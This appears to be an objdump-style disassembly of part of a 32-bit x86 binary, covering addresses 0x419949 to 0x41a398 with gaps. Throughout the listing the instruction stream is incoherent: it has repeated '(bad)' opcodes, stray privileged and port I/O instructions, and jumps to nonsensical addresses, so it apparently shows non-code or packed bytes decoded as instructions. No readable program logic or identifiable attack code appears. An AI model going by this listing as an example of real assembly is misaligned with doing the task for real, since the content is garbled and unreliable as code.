  419949:	push   0xa93747af
  41994e:	mul    BYTE PTR [edx]
  419950:	mov    WORD PTR [eax],es
  419952:	ret    0x263d
  419955:	sbb    DWORD PTR [ecx+0x33],ecx
  419958:	cwde   
  419959:	xchg   DWORD PTR [ecx+eiz*2+0x62],ebp
  41995d:	xchg   esp,eax
  41995e:	(bad)  
  41995f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419960:	adc    BYTE PTR [edx-0x6f48e76b],cl
  419966:	and    al,0xe7
  419968:	fisub  WORD PTR ss:[ecx]
  41996b:	inc    edi
  41996c:	lock cli 
  41996e:	pop    ds
  41996f:	ficomp WORD PTR [ebx]
  419971:	clc    
  419972:	dec    esp
  419973:	push   eax
  419974:	jl     0x4198f7
  419976:	out    dx,al
  419977:	push   es
  419978:	lea    eax,[esi]
  41997a:	imul   ecx,DWORD PTR [ecx+edi*8],0x49
  41997e:	mov    esi,0x839fbe9
  419983:	out    dx,al
  419984:	out    0xe8,eax
  419986:	jo     0x4199b8
  419988:	push   0xa
  41998a:	add    BYTE PTR [eax+0x1cabb55a],0xf7
  419991:	xchg   esi,eax
  419992:	inc    esi
  419993:	pop    esp
  419994:	adc    eax,0x4b915ef1
  419999:	rcr    BYTE PTR [eax+0x1d45c41f],cl
  41999f:	popa   
  4199a0:	mov    dh,0x5f
  4199a2:	outs   dx,DWORD PTR ds:[esi]
  4199a3:	psubusw mm3,mm1
  4199a6:	push   eax
  4199a7:	aam    0x44
  4199a9:	and    dh,BYTE PTR [ebx]
  4199ab:	in     eax,0x4a
  4199ad:	push   ecx
  4199ae:	aam    0x94
  4199b0:	mov    ebx,DWORD PTR [eax-0x56404a7c]
  4199b6:	push   ecx
  4199b7:	aas    
  4199b8:	ins    DWORD PTR es:[edi],dx
  4199b9:	bound  esi,QWORD PTR [ecx]
  4199bb:	inc    ecx
  4199bc:	loope  0x419993
  4199be:	pop    ecx
  4199bf:	add    al,BYTE PTR [eax]
  4199c1:	test   al,0x8f
  4199c3:	loope  0x41995e
  4199c5:	loop   0x419948
  4199c7:	pop    ebp
  4199c8:	fisub  DWORD PTR [esi-0x6d]
  4199cb:	xchg   bh,bh
  4199cd:	cdq    
  4199ce:	mov    bl,0x60
  4199d0:	jmp    0x419a10
  4199d2:	jp     0x41997c
  4199d4:	or     DWORD PTR [ebx],esp
  4199d6:	shl    BYTE PTR [esi+ebx*4],1
  4199d9:	or     esp,eax
  4199db:	adc    al,0x2a
  4199dd:	mov    esi,0xbd4c8f71
  4199e2:	retf   0x22ab
  4199e5:	shr    al,cl
  4199e7:	mov    cl,0x68
  4199e9:	xor    DWORD PTR [eax+esi*8-0x9],edi
  4199ed:	adc    BYTE PTR [ecx],0x2a
  4199f0:	lock dec edx
  4199f2:	loope  0x4199ed
  4199f4:	mov    eax,0xec5541fc
  4199f9:	add    DWORD PTR [esi-0x6c],esp
  4199fc:	sbb    BYTE PTR [ecx-0x2e],bl
  4199ff:	jle    0x4199a2
  419a01:	pop    ds
  419a02:	int    0x97
  419a04:	add    ebp,esi
  419a06:	adc    BYTE PTR [ebx+0x51b2d576],ch
  419a0c:	div    BYTE PTR [edx]
  419a0e:	fucomip st,st(6)
  419a10:	push   edi
	...
  419a71:	add    BYTE PTR [eax],al
  419a73:	add    BYTE PTR [ebx],dh
  419a75:	xor    DWORD PTR [ebx+0x77e793c5],edx
  419a7b:	test   ebx,0xdbc215d3
  419a81:	sbb    eax,0x100dd089
  419a86:	add    DWORD PTR [eax],eax
  419a88:	add    eax,0xd5000001
  419a8d:	adc    eax,0x645f3b05
  419a92:	or     al,ah
  419a94:	daa    
  419a95:	sub    BYTE PTR [ebx+eiz*4+0x22391ad6],dl
  419a9c:	ja     0x419af0
  419a9e:	xor    DWORD PTR [eax+0x4d],esp
  419aa1:	scas   al,BYTE PTR es:[edi]
  419aa2:	dec    eax
  419aa3:	dec    edi
  419aa4:	push   eax
  419aa5:	push   ss
  419aa6:	data16 jle 0x419b0e
  419aa9:	shl    cl,1
  419aab:	sub    al,0xd3
  419aad:	scas   eax,DWORD PTR es:[edi]
  419aae:	mov    ch,0xb4
  419ab0:	xchg   ecx,eax
  419ab1:	nop
  419ab2:	imul   esi,DWORD PTR [eax],0x55451eb4
  419ab8:	cmp    bl,ah
  419aba:	add    BYTE PTR [ecx-0x25],0x25
  419abe:	mov    ds:0x1c6f835d,al
  419ac3:	or     DWORD PTR [esi],ecx
  419ac5:	(bad)  
  419ac6:	jmp    0xdfb37421
  419acb:	dec    esi
  419acc:	inc    edx
  419acd:	fidiv  WORD PTR [edi+ebp*2-0xa662182]
  419ad4:	jno    0x419a94
  419ad6:	cmp    BYTE PTR [eax],ah
  419ad8:	push   ds
  419ad9:	mov    WORD PTR [edx+0x25],es
  419adc:	sbb    DWORD PTR [edi],0x151aafba
  419ae2:	mov    ah,BYTE PTR [eax]
  419ae4:	pop    ebx
  419ae5:	sub    DWORD PTR [ecx-0x72],ecx
  419ae8:	rcr    DWORD PTR [edi-0x4b6330a4],0x58
  419aef:	cmp    bl,ch
  419af1:	inc    eax
  419af2:	fldcw  WORD PTR [eax]
  419af4:	test   BYTE PTR [edi+0x6fa8dd24],ah
  419afa:	popa   
  419afb:	xchg   ebx,eax
  419afc:	or     eax,0x71ad13eb
  419b01:	push   esp
  419b02:	sar    DWORD PTR [edi],0x20
  419b05:	sub    ch,BYTE PTR [edx-0x14]
  419b08:	sti    
  419b09:	out    dx,eax
  419b0a:	or     eax,0x9850e1c2
  419b0f:	or     edi,DWORD PTR [edx-0x5e]
  419b12:	mov    es,WORD PTR [ecx+ecx*8+0x2838b9d9]
  419b19:	jg     0x419b06
  419b1b:	ret    0xba4b
  419b1e:	xlat   BYTE PTR ds:[ebx]
  419b1f:	xchg   esp,eax
  419b20:	out    0x7e,al
  419b22:	jg     0x419b51
  419b24:	sti    
  419b25:	mov    ds:0x3039d5ad,al
  419b2a:	jecxz  0x419abd
  419b2c:	add    dh,bl
  419b2e:	mov    esp,0xee4f9689
  419b33:	in     al,0x5f
  419b35:	inc    edi
  419b36:	in     al,dx
  419b37:	imul   esp,DWORD PTR [ecx-0x42],0x25
  419b3b:	and    edx,esp
  419b3d:	mov    dl,0x33
  419b3f:	xchg   esp,eax
  419b40:	add    esp,ebp
  419b42:	call   0xfd01f21
  419b47:	add    BYTE PTR [edx-0x53239153],0xb3
  419b4e:	jl     0x419ba8
  419b50:	mov    ebx,edi
  419b52:	test   DWORD PTR [ebp-0x26],edi
  419b55:	pop    ecx
  419b56:	dec    esp
  419b57:	imul   ebx,DWORD PTR [ecx],0xe7dc218f
  419b5d:	push   0x8907fe0f
  419b62:	jle    0x419b35
  419b64:	out    dx,eax
  419b65:	xchg   DWORD PTR [esi-0x13],edi
  419b68:	xor    BYTE PTR [ebx-0x5d],ch
  419b6b:	jl     0x419af7
  419b6d:	test   eax,0xf0c2a8fa
  419b72:	imul   edi,DWORD PTR [edx+ebp*1+0x28a18ec5],0x44
  419b7a:	sbb    DWORD PTR [ebp-0x63],0xffffffc3
  419b7e:	ror    BYTE PTR [eax+0x68],cl
  419b81:	and    ecx,0xffffff9f
  419b84:	in     eax,0x8c
  419b86:	mov    esi,0x868c3b97
  419b8b:	inc    esi
  419b8c:	hlt    
  419b8d:	sbb    edx,DWORD PTR [eax+eiz*8+0x73]
	...
  419bf1:	add    BYTE PTR [eax],al
  419bf3:	add    BYTE PTR [edx-0x3c],cl
  419bf6:	cli    
  419bf7:	inc    edi
  419bf8:	(bad)  
  419bf9:	jg     0x419bfa
  419bfb:	int    0x88
  419bfd:	xchg   ecx,eax
  419bfe:	lods   al,BYTE PTR ds:[esi]
  419bff:	or     al,0x5c
  419c01:	ss dec esp
  419c03:	inc    esp
  419c04:	adc    dl,BYTE PTR [ecx]
  419c06:	add    DWORD PTR [eax],eax
  419c08:	add    eax,0xd0000001
  419c0d:	scas   al,BYTE PTR es:[edi]
  419c0e:	push   eax
  419c0f:	int3   
  419c10:	popf   
  419c11:	in     eax,dx
  419c12:	push   ds
  419c13:	lods   eax,DWORD PTR ds:[esi]
  419c14:	leave  
  419c15:	ror    DWORD PTR [esi+eiz*8],cl
  419c18:	sub    dl,ch
  419c1a:	(bad)  
  419c1e:	jb     0x419bac
  419c20:	push   ecx
  419c21:	push   cs
  419c22:	fimul  WORD PTR [ebp-0xf835820]
  419c28:	ins    DWORD PTR es:[edi],dx
  419c29:	arpl   WORD PTR [edx-0x2b],di
  419c2c:	data16 add BYTE PTR [edx+0x30],al
  419c30:	jo     0x419c04
  419c32:	sub    al,0xc1
  419c34:	(bad)  
  419c35:	sub    al,0x86
  419c37:	push   edx
  419c38:	test   BYTE PTR [ebp+eiz*1-0x79],cl
  419c3c:	push   ebx
  419c3d:	and    al,0x73
  419c3f:	gs pop ss
  419c41:	mov    dl,0xeb
  419c43:	iret   
  419c44:	xchg   ebp,eax
  419c45:	pop    edi
  419c46:	and    BYTE PTR [edx+esi*2+0x99a7efa],ch
  419c4d:	add    esp,0xffffffb2
  419c50:	cmovge eax,DWORD PTR [ebx-0x3617f2fc]
  419c57:	imul   ebx,edi,0xf3369148
  419c5d:	retf   
  419c5e:	xor    eax,0x37edfe31
  419c63:	pusha  
  419c64:	and    eax,0xb9794f81
  419c69:	cmp    bh,BYTE PTR ds:0xfcab8068
  419c6f:	adc    al,0xab
  419c71:	add    ebp,DWORD PTR [ebp+ebp*8+0x25b997bb]
  419c78:	push   ds
  419c79:	mov    BYTE PTR [edi+ebp*8+0x1c999cdd],cl
  419c80:	push   ebx
  419c81:	sub    al,0x72
  419c83:	push   es
  419c84:	sub    DWORD PTR [eax+0x67c967e5],edx
  419c8a:	data16 aam 0x22
  419c8d:	lahf   
  419c8e:	js     0x419cf5
  419c90:	in     al,dx
  419c91:	inc    edi
  419c92:	adc    al,0x89
  419c94:	inc    WORD PTR es:0x5c86bfc4
  419c9c:	hlt    
  419c9d:	push   DWORD PTR [edi-0x6496e22c]
  419ca3:	pop    edx
  419ca4:	push   ds
  419ca5:	fcmovne st,st(2)
  419ca7:	jge    0x419d13
  419ca9:	push   es
  419caa:	dec    ecx
  419cab:	xor    al,0x2c
  419cad:	div    eax
  419caf:	dec    ebx
  419cb0:	repz jae 0x419c69
  419cb3:	(bad)  
  419cb4:	push   esp
  419cb5:	pusha  
  419cb6:	imul   edi,DWORD PTR [eax+0x21],0x56
  419cba:	adc    dh,0x1f
  419cbd:	loop   0x419d16
  419cbf:	shl    cl,1
  419cc1:	lods   eax,DWORD PTR ds:[esi]
  419cc2:	push   ss
  419cc3:	imul   eax,DWORD PTR ds:[esi-0x5d],0x7e
  419cc8:	ficomp DWORD PTR [esi+edi*1-0x6fcfd260]
  419cd0:	mov    al,BYTE PTR [ebp+0x53]
  419cd3:	enter  0x2b0b,0xe7
  419cd7:	xor    eax,0xd09fab58
  419cdc:	cmp    DWORD PTR [eax+ebp*1+0x4f08d45e],ebp
  419ce3:	jl     0x419d55
  419ce5:	ss sti 
  419ce7:	jle    0x419d5e
  419ce9:	pushf  
  419cea:	mov    eax,ebp
  419cec:	and    BYTE PTR [esi+0x74db2f6c],cl
  419cf2:	xchg   ecx,eax
  419cf3:	sub    cl,BYTE PTR [edi-0x32]
  419cf6:	sbb    cl,BYTE PTR [edi+0x633fb3d9]
  419cfc:	push   ds
  419cfd:	add    BYTE PTR [ecx],al
  419cff:	cmp    eax,0x90cdf253
  419d04:	push   ebx
  419d05:	test   DWORD PTR [edx+0x1e],0xed1b0587
  419d0c:	out    0xc2,eax
  419d0e:	imul   ecx,DWORD PTR [ebp+0x22],0x0
	...
  419d72:	add    BYTE PTR [eax],al
  419d74:	lock xchg edi,eax
  419d76:	std    
  419d77:	cmp    al,0xff
  419d79:	jle    0x419d6c
  419d7b:	fistp  QWORD PTR [edi-0x16]
  419d7e:	fiadd  DWORD PTR ss:[ecx]
  419d81:	scas   al,BYTE PTR es:[edi]
  419d82:	pop    ebp
  419d83:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419d84:	pop    ss
  419d85:	adc    al,BYTE PTR [ecx]
  419d87:	add    BYTE PTR ds:0x3f000001,al
  419d8d:	ja     0x419d5b
  419d8f:	jp     0x419d61
  419d91:	sbb    BYTE PTR [edx+0x3bcfe48],cl
  419d97:	mov    dh,0xf3
  419d99:	mov    ds:0xfef86ce9,al
  419d9e:	ret    
  419d9f:	out    dx,eax
  419da0:	div    DWORD PTR [esi+0x57]
  419da3:	sub    al,0x26
  419da5:	pop    edi
  419da6:	into   
  419da7:	or     ch,bl
  419da9:	inc    edx
  419daa:	add    BYTE PTR gs:[edx-0x4015e888],ch
  419db1:	daa    
  419db2:	stc    
  419db3:	push   esi
  419db4:	gs pop ebp
  419db6:	inc    ecx
  419db7:	(bad)  
  419db8:	test   DWORD PTR [ebx-0x1170c301],0xf1a49060
  419dc2:	adc    eax,0x43eedc30
  419dc7:	ss repnz mov edx,0x6e49d687
  419dce:	inc    edx
  419dcf:	push   ds
  419dd0:	adc    al,0xc6
  419dd2:	cmp    ebx,esp
  419dd4:	mov    esp,DWORD PTR [edx+0x50]
  419dd7:	pusha  
  419dd8:	inc    esp
  419dd9:	mov    ecx,0xc8bd15af
  419dde:	xor    dh,BYTE PTR [ecx]
  419de0:	mov    al,0x1b
  419de2:	and    eax,0x30b37e75
  419de7:	xchg   ebp,eax
  419de8:	pop    ds
  419de9:	add    al,0x46
  419deb:	pop    ecx
  419dec:	mov    ebx,0x4d962e0e
  419df1:	shl    cl,1
  419df3:	out    dx,al
  419df4:	aas    
  419df5:	xor    dl,BYTE PTR [eax+0x7a]
  419df8:	mov    ebp,0x5a40dc4d
  419dfd:	ins    DWORD PTR es:[edi],dx
  419dfe:	repnz out dx,al
  419e00:	cmp    eax,0x9536dcfb
  419e05:	lock push ebp
  419e07:	enter  0xd85d,0x25
  419e0b:	outs   dx,BYTE PTR ds:[esi]
  419e0c:	xchg   ebp,eax
  419e0d:	cmp    BYTE PTR [edi+0x53],0xe1
  419e11:	je     0x419df6
  419e13:	jae    0x419dcd
  419e15:	pop    esi
  419e16:	mov    ebx,0xdbfea13d
  419e1b:	fdiv   DWORD PTR [edx+0x30]
  419e1e:	mov    ebx,ecx
  419e20:	cmp    dl,ah
  419e22:	mov    BYTE PTR gs:[edx],0x21
  419e26:	(bad)  
  419e27:	mov    esp,0x375f9d83
  419e2c:	(bad)  
  419e2d:	and    al,0x6f
  419e2f:	mov    BYTE PTR [eax-0x1745a5cc],dl
  419e35:	adc    DWORD PTR [ecx],0xddd955a6
  419e3b:	mov    ch,0x2b
  419e3d:	scas   al,BYTE PTR es:[edi]
  419e3e:	bound  esp,QWORD PTR [eax-0x34]
  419e41:	aaa    
  419e42:	je     0x419e70
  419e44:	dec    ecx
  419e45:	or     ebx,DWORD PTR [eax]
  419e47:	jne    0x419dcf
  419e49:	jno    0x419e29
  419e4b:	mov    eax,0x7056e9c5
  419e50:	jl     0x419ebc
  419e52:	loope  0x419e86
  419e54:	fisttp DWORD PTR [esp+esi*8+0x695244e]
  419e5b:	push   eax
  419e5c:	inc    ebx
  419e5d:	cmp    DWORD PTR [ebx],esi
  419e5f:	xchg   esi,eax
  419e60:	lock (bad) 
  419e62:	cwde   
  419e63:	fs sbb eax,ebp
  419e66:	fisub  DWORD PTR [ecx]
  419e68:	lock or al,0xb0
  419e6b:	call   0x4e6a4d2d
  419e70:	gs jne 0x419e83
  419e73:	add    eax,0x939fcb48
  419e78:	cmp    edi,ebx
  419e7a:	stc    
  419e7b:	and    eax,0xe41bb639
  419e80:	jbe    0x419e75
  419e82:	lahf   
  419e83:	mov    ah,0x45
  419e85:	loope  0x419e23
  419e87:	popa   
  419e88:	xor    BYTE PTR [esi],al
  419e8a:	cdq    
  419e8b:	adc    eax,DWORD PTR [ecx+0x15ffc86d]
	...
  419ef1:	add    BYTE PTR [eax],al
  419ef3:	add    BYTE PTR [edi+0x5fc517d8],al
  419ef9:	iret   
  419efa:	xlat   BYTE PTR ds:[ebx]
  419efb:	ficomp DWORD PTR [edi+ebp*4+0x55]
  419eff:	inc    esi
  419f00:	cli    
  419f01:	iret   
  419f02:	sbb    al,0xe1
  419f04:	sbb    al,0x13
  419f06:	add    DWORD PTR [eax],eax
  419f08:	add    eax,0xa1000001
  419f0d:	jns    0x419f31
  419f0f:	sbb    eax,0x978a52a0
  419f14:	adc    al,0x7a
  419f16:	push   esi
  419f17:	and    al,0x92
  419f19:	or     bl,bh
  419f1b:	lea    ebx,[esp+edi*4+0x325de734]
  419f22:	fidiv  DWORD PTR [edi+0x1c]
  419f25:	mov    esp,0x26e469a8
  419f2a:	mov    WORD PTR [edx+0x517dcaaf],ds
  419f30:	add    al,0x72
  419f32:	hlt    
  419f33:	std    
  419f34:	mov    eax,ds:0x8b6089ca
  419f39:	in     al,0xdb
  419f3b:	xchg   edx,eax
  419f3c:	leave  
  419f3d:	push   esi
  419f3e:	mov    edx,0x501d1ba2
  419f43:	sub    ebx,ebx
  419f45:	mov    ah,0xca
  419f47:	fwait
  419f48:	jnp    0x419f6d
  419f4a:	xor    BYTE PTR [ebx],dl
  419f4c:	adc    BYTE PTR [ebx+0x4873723a],dh
  419f52:	mov    ebp,0x337fe62b
  419f57:	push   ds
  419f58:	pop    ds
  419f59:	or     al,0x41
  419f5b:	add    al,0x0
  419f5d:	mov    ebp,DWORD PTR [ebx+0x6427994f]
  419f63:	xor    DWORD PTR [ecx+0x13532cec],ebx
  419f69:	inc    edi
  419f6a:	add    eax,0xa27eb43f
  419f6f:	ror    al,cl
  419f71:	leave  
  419f72:	imul   DWORD PTR [ecx]
  419f74:	add    BYTE PTR [ebx-0x1f9cfdc1],dh
  419f7a:	jne    0x419f04
  419f7c:	mov    esi,0x9dfed67a
  419f81:	mov    edi,0xeb46cbaf
  419f86:	test   ah,ch
  419f88:	pop    esp
  419f89:	ret    
  419f8a:	gs mov ecx,0x70dd5d50
  419f90:	dec    edx
  419f91:	lds    eax,FWORD PTR [edi]
  419f93:	cdq    
  419f94:	loop   0x41a014
  419f96:	push   ebp
  419f97:	nop
  419f98:	and    eax,DWORD PTR [edx]
  419f9a:	and    ah,BYTE PTR [eax]
  419f9c:	xchg   edi,eax
  419f9d:	int3   
  419f9e:	enter  0x186c,0x2d
  419fa2:	(bad)  
  419fa3:	push   esi
  419fa4:	cdq    
  419fa5:	or     DWORD PTR [eax],eax
  419fa7:	or     DWORD PTR [esp+edi*2+0x5aeabb20],esi
  419fae:	push   esp
  419faf:	lods   al,BYTE PTR ds:[esi]
  419fb0:	(bad)  
  419fb1:	out    0x8e,al
  419fb3:	jl     0x41a004
  419fb5:	sub    BYTE PTR [ecx+esi*1-0x10ebaa38],0x82
  419fbd:	lahf   
  419fbe:	call   0x2888a8ab
  419fc3:	mov    eax,ds:0x728acc23
  419fc8:	rol    BYTE PTR [ebx-0x83ce219],0x15
  419fcf:	ds mov esi,0x598ef8d6
  419fd5:	lahf   
  419fd6:	lds    ebp,FWORD PTR [ecx]
  419fd8:	std    
  419fd9:	test   BYTE PTR [ebx-0x5261b579],bh
  419fdf:	sub    BYTE PTR [edi],al
  419fe1:	adc    al,BYTE PTR [edi]
  419fe3:	sub    BYTE PTR [ecx],dl
  419fe5:	mov    ebp,ebx
  419fe7:	outs   dx,BYTE PTR ds:[esi]
  419fe8:	mov    ebx,?
  419fea:	sub    edx,ecx
  419fec:	xchg   ebx,eax
  419fed:	or     BYTE PTR [ecx+0x60ae2238],dl
  419ff3:	out    0x8e,al
  419ff5:	jne    0x419fb8
  419ff7:	push   edi
  419ff8:	mov    ebx,0xd52ff502
  419ffd:	in     al,0xae
  419fff:	pop    ebx
  41a000:	dec    ebp
  41a001:	mov    ebp,0xbb32d431
  41a006:	or     DWORD PTR [ecx+eax*8],esp
  41a009:	repnz bound ecx,QWORD PTR [ebp+ebp*1+0x3808363]
	...
  41a071:	add    BYTE PTR [eax],al
  41a073:	add    BYTE PTR [esi-0x15],cl
  41a076:	sub    cl,BYTE PTR [esi-0x51]
  41a079:	iret   
  41a07a:	outs   dx,BYTE PTR ds:[esi]
  41a07b:	jmp    0x41a000
  41a07d:	push   edx
  41a07e:	test   BYTE PTR [eax-0x17],bh
  41a081:	outs   dx,BYTE PTR ds:[esi]
  41a082:	sub    cl,BYTE PTR [edx]
  41a084:	and    DWORD PTR [ecx+eax*1],edx
  41a087:	add    BYTE PTR ds:0x9000001,al
  41a08d:	(bad)  
  41a08e:	ins    DWORD PTR es:[edi],dx
  41a08f:	test   eax,0x8815427
  41a094:	mov    esp,0x77c383c7
  41a099:	push   ebx
  41a09a:	xor    eax,0x5b8d8a43
  41a09f:	pop    esi
  41a0a0:	xor    ch,BYTE PTR [esi]
  41a0a2:	pop    ds
  41a0a3:	retf   
  41a0a4:	popf   
  41a0a5:	stos   DWORD PTR es:[edi],eax
  41a0a6:	jae    0x41a114
  41a0a8:	(bad)  
  41a0a9:	lods   eax,DWORD PTR ds:[esi]
  41a0aa:	sub    eax,0x84e020a4
  41a0af:	sub    BYTE PTR [edi-0x8],ah
  41a0b2:	stos   BYTE PTR es:[edi],al
  41a0b3:	xor    edi,DWORD PTR [ecx+0x4274d224]
  41a0b9:	push   ss
  41a0ba:	jmp    0x3bb05c67
  41a0bf:	rcr    esp,1
  41a0c1:	dec    edi
  41a0c2:	pop    eax
  41a0c3:	pop    ss
  41a0c4:	call   0x5dc0f628
  41a0c9:	ret    
  41a0ca:	push   0x2d6d35ad
  41a0cf:	xor    BYTE PTR [ecx],ah
  41a0d1:	and    bl,ch
  41a0d3:	mov    bl,0xf9
  41a0d5:	sub    BYTE PTR [edi+0x1f],0x66
  41a0d9:	sbb    bl,BYTE PTR [esp+eax*8-0x20ff8a65]
  41a0e0:	mov    cl,0xab
  41a0e2:	sti    
  41a0e3:	dec    eax
  41a0e4:	push   0x97df66d2
  41a0e9:	add    eax,DWORD PTR [edx+0x36]
  41a0ec:	inc    esp
  41a0ed:	xchg   ebp,eax
  41a0ee:	pop    es
  41a0ef:	loopne 0x41a149
  41a0f1:	clc    
  41a0f2:	std    
  41a0f3:	adc    esp,edi
  41a0f5:	das    
  41a0f6:	push   edx
  41a0f7:	push   es
  41a0f8:	cmp    eax,0xcaafb15b
  41a0fd:	adc    al,BYTE PTR [ebx]
  41a0ff:	lock pusha 
  41a101:	pop    ebx
  41a102:	(bad)
  41a105:	mov    edi,0xb180e99b
  41a10a:	cs hlt 
  41a10c:	loopne 0x41a08f
  41a10e:	loop   0x41a0ad
  41a110:	ror    BYTE PTR [ecx+0x71d5564c],cl
  41a116:	inc    eax
  41a117:	int3   
  41a118:	jae    0x41a127
  41a11a:	jbe    0x41a10e
  41a11c:	sbb    BYTE PTR [ebp+0x68],dh
  41a11f:	add    BYTE PTR [ecx-0x2ecabd6e],0x3f
  41a126:	data16 jg 0x41a17b
  41a129:	cs jle 0x41a0ea
  41a12c:	xor    ch,cl
  41a12e:	sbb    eax,0x359e90c2
  41a133:	(bad)  
  41a134:	inc    bx
  41a136:	js     0x41a0b8
  41a138:	loopne 0x41a0eb
  41a13a:	addr16 mov cl,0x29
  41a13d:	pop    es
  41a13e:	jno    0x41a19c
  41a140:	mov    dh,cl
  41a142:	ret    0xd39
  41a145:	sti    
  41a146:	repnz clc 
  41a148:	add    bl,BYTE PTR [ebx+0x6640efae]
  41a14e:	jl     0x41a144
  41a150:	fs dec ebp
  41a152:	mov    dh,dh
  41a154:	out    0x24,eax
  41a156:	dec    ecx
  41a157:	add    DWORD PTR [ebx],edi
  41a159:	ins    DWORD PTR es:[edi],dx
  41a15a:	cmp    DWORD PTR [esi+0x2791be47],ebx
  41a160:	add    eax,0x8f4b8079
  41a165:	fbstp  TBYTE PTR [ebx]
  41a167:	add    dh,BYTE PTR [edx+eiz*2+0x42]
  41a16b:	inc    esi
  41a16c:	or     DWORD PTR es:[edi-0x39b624ac],ebx
  41a173:	mov    bl,0xa8
  41a175:	xor    edi,ecx
  41a177:	push   edx
  41a178:	gs inc edi
  41a17a:	cld    
  41a17b:	(bad)  
  41a17c:	cmc    
  41a17d:	mov    cs,WORD PTR [esp+edi*1+0xb]
  41a181:	(bad)  
  41a182:	xor    dl,BYTE PTR [ebp+0x5b]
  41a185:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a186:	repz dec eax
  41a188:	or     eax,0x50aa9abb
  41a18d:	mov    al,0x82
  41a18f:	aas    
  41a190:	mov    DWORD PTR [eax],eax
	...
  41a1f2:	add    BYTE PTR [eax],al
  41a1f4:	sbb    al,0xc
  41a1f6:	std    
  41a1f7:	sbb    ebp,edi
  41a1f9:	stc    
  41a1fa:	cld    
  41a1fb:	or     eax,0x398d6850
  41a200:	daa    
  41a201:	je     0x41a202
  41a203:	xor    ah,BYTE PTR [esi]
  41a205:	adc    eax,0x1050001
  41a20a:	add    BYTE PTR [eax],al
  41a20c:	fcomi  st,st(3)
  41a20e:	fiadd  DWORD PTR ds:0x3be1ace3
  41a214:	mov    edx,0x61ba6151
  41a219:	repnz or bl,cl
  41a21c:	aam    0x78
  41a21e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a21f:	loop   0x41a253
  41a221:	dec    edi
  41a222:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a223:	adc    DWORD PTR [eax+0xe32272c],0xffffffa9
  41a22a:	out    0x1,al
  41a22c:	push   cs
  41a22d:	and    al,BYTE PTR ds:0xbe0a6a95
  41a233:	std    
  41a234:	and    DWORD PTR [esi+0x58cd72d3],edx
  41a23a:	add    ebp,eax
  41a23c:	js     0x41a207
  41a23e:	out    0x1c,al
  41a240:	loopne 0x41a1fa
  41a242:	cs lahf 
  41a244:	ret    0x5281
  41a247:	pop    eax
  41a248:	push   edi
  41a249:	mov    eax,ds:0xc7177323
  41a24e:	cmp    ecx,DWORD PTR [ebx+0x2343bfc2]
  41a254:	daa    
  41a255:	bound  ebx,QWORD PTR [eax+0x56b1e51f]
  41a25b:	lea    edi,[edx-0x1fe4e1a]
  41a261:	in     eax,dx
  41a262:	sbb    bh,al
  41a264:	and    BYTE PTR [edx-0x1f9a161c],cl
  41a26a:	mov    ebx,0xa0a9c69c
  41a26f:	lock sub BYTE PTR [eax+0x5],0x39
  41a274:	addr16 mov cl,0x83
  41a277:	jbe    0x41a2e5
  41a279:	test   BYTE PTR [ecx],0xc7
  41a27c:	xchg   ecx,eax
  41a27d:	push   cs
  41a27e:	sub    BYTE PTR [ebp-0x76cc8ada],bl
  41a284:	popa   
  41a285:	adc    BYTE PTR [edx-0x60],bh
  41a288:	(bad)  
  41a289:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  41a28b:	jne    0x41a2a1
  41a28d:	pop    ss
  41a28e:	xchg   BYTE PTR [edx],dl
  41a290:	in     eax,dx
  41a291:	push   ebp
  41a292:	sbb    BYTE PTR [edi-0x6f],al
  41a295:	fwait
  41a296:	or     BYTE PTR [ecx-0x216a20cd],bh
  41a29c:	push   ds
  41a29d:	xchg   edi,eax
  41a29e:	xor    al,0x74
  41a2a0:	stos   BYTE PTR es:[edi],al
  41a2a1:	sub    cl,BYTE PTR [eax-0x71]
  41a2a4:	div    DWORD PTR [eax+0x6e]
  41a2a7:	xchg   ebx,eax
  41a2a8:	pop    ebp
  41a2a9:	push   esi
  41a2aa:	xor    al,0xe8
  41a2ac:	cli    
  41a2ad:	mov    cl,dh
  41a2af:	sbb    bl,BYTE PTR [ebp-0x414de163]
  41a2b5:	cld    
  41a2b6:	jnp    0x41a32e
  41a2b8:	cmc    
  41a2b9:	and    DWORD PTR [eax+0x6c05e1f6],0xffffff8b
  41a2c0:	push   eax
  41a2c1:	lods   al,BYTE PTR ds:[esi]
  41a2c2:	mov    ah,0xd8
  41a2c4:	pushf  
  41a2c5:	das    
  41a2c6:	sbb    DWORD PTR [ebp-0x1b],ebp
  41a2c9:	mov    cl,0x2d
  41a2cb:	pop    eax
  41a2cc:	push   esp
  41a2cd:	stc    
  41a2ce:	inc    ebp
  41a2cf:	adc    al,BYTE PTR [edi]
  41a2d1:	cs xchg ecx,eax
  41a2d3:	and    ch,BYTE PTR ss:[eax]
  41a2d6:	sbb    edx,edx
  41a2d8:	icebp  
  41a2d9:	or     DWORD PTR [edi+0x39],ebx
  41a2dc:	cli    
  41a2dd:	jle    0x41a2ea
  41a2df:	and    edi,edi
  41a2e1:	add    bh,BYTE PTR [edi-0x3d]
  41a2e4:	mov    WORD PTR [ebp+0x3e],ss
  41a2e7:	shl    BYTE PTR [edi-0x35],0x88
  41a2eb:	sub    eax,0xc2a052ad
  41a2f0:	je     0x41a305
  41a2f2:	scas   al,BYTE PTR es:[edi]
  41a2f3:	pop    edi
  41a2f4:	mov    eax,ds:0xe9ead014
  41a2f9:	test   ebx,edi
  41a2fb:	fimul  DWORD PTR [eax]
  41a2fd:	data16 repnz lahf 
  41a300:	jbe    0x41a34f
  41a302:	sub    DWORD PTR [ebp+0x6cb534d8],ebx
  41a308:	pop    edx
  41a309:	cmp    ch,BYTE PTR [esp+esi*8+0x4b832c64]
  41a310:	dec    esp
	...
  41a371:	add    BYTE PTR [eax],al
  41a373:	add    bh,dh
  41a375:	pop    eax
  41a376:	test   al,0x13
  41a378:	scas   eax,DWORD PTR es:[edi]
  41a379:	repz (bad) 
  41a37b:	cld    
  41a37c:	adc    eax,0x3fa6955c
  41a381:	es jns 0x41a3d3
  41a384:	sub    edx,DWORD PTR [esi]
  41a386:	add    DWORD PTR [eax],eax
  41a388:	add    eax,0xe6000001
  41a38d:	push   esi
  41a38e:	mov    bl,al
  41a390:	or     bh,dl
  41a392:	loopne 0x41a40b
  41a394:	mov    fs,WORD PTR [edi+0x6d]
  41a397:	std    
  41a398:	popf   
